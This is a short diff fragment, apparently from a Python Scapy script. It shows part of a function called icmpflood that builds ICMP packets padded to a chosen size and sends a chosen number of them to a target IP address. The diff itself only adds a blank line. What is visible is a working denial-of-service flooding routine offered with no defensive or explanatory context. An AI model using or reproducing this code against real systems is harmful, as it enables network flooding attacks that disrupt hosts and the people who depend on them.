@@ -5,3 +5,4 @@ def icmpflood (targetip, number, size):
     data = Raw(b"X" * size)
     p = ip / ICMP() / data
     send(p, count=number, verbose=0)
+
